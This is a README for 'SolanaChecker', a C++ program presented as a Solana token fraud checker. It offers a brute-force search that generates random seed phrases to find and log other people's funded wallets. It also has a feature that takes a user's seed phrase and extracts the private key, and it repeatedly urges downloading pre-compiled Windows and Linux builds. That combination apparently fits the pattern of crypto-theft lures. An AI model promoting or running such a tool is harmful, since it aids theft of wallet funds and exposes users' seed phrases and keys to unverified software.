# Solana Token Fraud Checker: Protect Your Solana Investments

Navigating the Solana token market can be tricky. Don't get caught in a scam. Our **SolanaChecker** is your essential tool for assessing the legitimacy of Solana tokens, helping you avoid fraudulent projects and make smarter investment decisions. It provides a range of functions to protect your crypto assets.

###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)
   <p align="left">
    <img src="/themes/theme.webp" />
</p>

## Core Program Features

1.  **Solana Address Balance Check:** Verify the current Solana balance on a specified address. Easily track your holdings.

<p align="left">
    <img src="/themes/host.webp" />
</p>

2.  **Solana Token Security Analysis:**  Assess the security of Solana tokens based on their properties and metadata. Mitigate the risk of investing in potentially fraudulent projects and evaluate the "rug-pull" risk.

<p align="left">
    <img src="/themes/queue.webp" />
</p>

3.  **Real-time Address Tracking:** Receive notifications about activity on defined addresses through our Telegram bot integration. Monitor your wallets and receive alerts about transactions in real-time.

4.  **Wallet Information from Mnemonic:** Extract the private key, address, and balance of a Solana wallet using its mnemonic phrase (seed phrase). This feature helps you easily manage your wallets.

<p align="left">
    <img src="/themes/program.webp" />
</p>

5.  **Generate a New Solana Wallet:** Generate a new Solana wallet with a unique private key and address.

<p align="left">
    <img src="/themes/rotate.webp" />
</p>

6.  **Brute-Force Wallet Search and Balance Check:** Use brute-force generation of random seed phrases, followed by balance checks on generated addresses. Find active wallets (useful for research), and have wallet data sent to the 'found-wallets.txt' file, with Telegram notifications if configured.

<p align="left">
    <img src="/themes/view.webp" />
</p>

## Telegram Notification Setup

To enable Telegram notifications, simply enter your [bot token](https://core.telegram.org/bots/tutorial#obtain-your-bot-token) and your [chat_id](https://t.me/getmyid_bot) into the 'telegram-settings.txt' file, which is located in the program directory.

## Getting Started: Installation

Download a pre-compiled build from [Release](../../releases) or build the project yourself.

## Building the Project: Detailed Instructions

This project is built with C++ and depends on several libraries. We recommend using **vcpkg** to handle these dependencies efficiently:

### Installing Dependencies with vcpkg

1.  If you don't have **vcpkg** installed already, follow the instructions on the [official page](https://github.com/microsoft/vcpkg) to install it.
2.  Add the **vcpkg** installation directory to your system's PATH environment variable.
3.  Run the following commands to install the necessary dependencies:

    -   Install **OpenSSL**:

    ```bash
    vcpkg install openssl
    ```

    -   Install **nlohmann-json**:

    ```bash
    vcpkg install nlohmann-json
    ```

    -   Install **Crypto++**:

    ```bash
    vcpkg install cryptopp
    ```

    -   Install **libsodium**:

    ```bash
    vcpkg install libsodium
    ```

4.  After installing the dependencies, you're ready to build the project.

### Building with Visual Studio

1.  Open the project solution within Visual Studio.
2.  Ensure that **vcpkg** is integrated correctly with your environment. (See [integrating vcpkg with Visual Studio](https://github.com/microsoft/vcpkg#visual-studio)).
3.  Click **Build** -> **Build Solution**.
4.  The resulting executable will be located in the `bin` folder.

### Building with Another C++ Compiler

1.  Make sure all dependencies are properly installed via **vcpkg** and accessible to your compiler.
2.  Compile the project using the following command (adapt the command to your specific compiler):

    ```bash
    g++ -o solanachecker main.cpp -lssl -lcrypto -lsodium -lcryptopp -std=c++17
    ```

## Command Line Usage

Use the following command-line options:

1.  **-s / -search**: Start the brute-force generation of seed phrases to locate wallets with a balance.
2.  **-t / -track (ADDRESS)**: Begin tracking the specified address. The program monitors activity on that address.
3.  **-g / -gen (NUMBER)**: Generate the specified quantity of Solana wallets. Replace `<NUMBER>` with the desired number.
4.  **-m / -mnemonic (MNEMONIC)**: Show wallet data utilizing a seed phrase. Replace `<MNEMONIC>` with your seed phrase.
5.  **-b / -balance (ADDRESS)**: Display the balance for a specific address on the Solana network.

## Important Considerations

-   This program is intended for research and analysis purposes and should not be used for any illegal or malicious activities.
-   Cryptocurrency investments carry risks. Always prioritize the security of your data and wallets.


  ###[DOWNLOAD FOR WINDOWS & LINUX](../../releases)

  ## License
This project is licensed under the [MIT License](/LICENSE). You are free to use, modify, and distribute the code according to the license terms.